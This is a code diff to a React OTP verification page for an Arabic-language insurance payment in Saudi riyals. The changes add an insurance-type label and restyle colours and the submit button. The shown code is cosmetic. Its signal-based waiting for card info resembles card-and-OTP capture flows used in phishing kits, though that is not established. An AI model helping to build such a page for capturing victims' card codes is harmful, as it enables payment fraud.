@@ -27,6 +27,7 @@ export default function OTPVerification() {
   const cardLast4 = paymentData.cardLast4 || "****";
   const totalAmount = paymentData.totalPaid || 0;
   const serviceName = paymentData.serviceName || "";
+  const insuranceType = localStorage.getItem('insuranceType') || 'ضد الغير';
   
   // Get card info from localStorage (fallback) or signal
   const signalCardInfo = waitingCardInfo.value;
@@ -205,13 +206,13 @@ export default function OTPVerification() {
             سيتم الاتصال بك أو إرسال رمز من قبل البنك المصدر للبطاقة الائتمانية المنتهية بـ <span className="font-bold">{cardLast4}</span>. يرجى إدخال رمز التحقق لتأكيد العملية.
           </p>
           <p className="mt-2">
-            أنت تدفع لـ<span className="font-bold">{serviceName}</span> مبلغ <span className="font-bold text-primary">{totalAmount} ر.س</span> بتاريخ {formatDate(currentTime)} في التوقيت {formatTime(currentTime)}
+            أنت تدفع رسوم تأمين {insuranceType} لـ<span className="font-bold">{serviceName}</span> مبلغ <span className="font-bold" style={{ color: '#1a5276' }}>{totalAmount} ر.س</span> بتاريخ {formatDate(currentTime)} في التوقيت {formatTime(currentTime)}
           </p>
         </div>
 
         {/* Success Message */}
         <div className="text-center mb-4">
-          <span className="text-primary font-medium">تم إرسال الرمز بنجاح</span>
+          <span className="font-medium" style={{ color: '#1a5276' }}>تم إرسال الرمز بنجاح</span>
         </div>
 
         <form onSubmit={handleSubmit} className="space-y-4">
@@ -225,7 +226,7 @@ export default function OTPVerification() {
               value={otp}
               onChange={handleChange}
               placeholder="رمز التحقق (OTP)"
-              className={`text-center text-lg font-medium h-12 w-full max-w-xs ${error ? "border-red-500" : "border-gray-300"}`}
+              className={`text-center text-lg font-medium h-12 w-full max-w-xs ${error ? "border-red-500" : "border-[#1a5276]"}`}
               autoFocus
             />
           </div>
@@ -239,7 +240,8 @@ export default function OTPVerification() {
           {/* Submit Button */}
           <Button 
             type="submit" 
-            className="w-full h-12 text-base" 
+            className="w-full h-12 text-base text-white hover:opacity-90" 
+            style={{ backgroundColor: '#1a5276' }}
             disabled={isWaiting || (otp.length !== 4 && otp.length !== 6)}
           >
             {isWaiting ? (
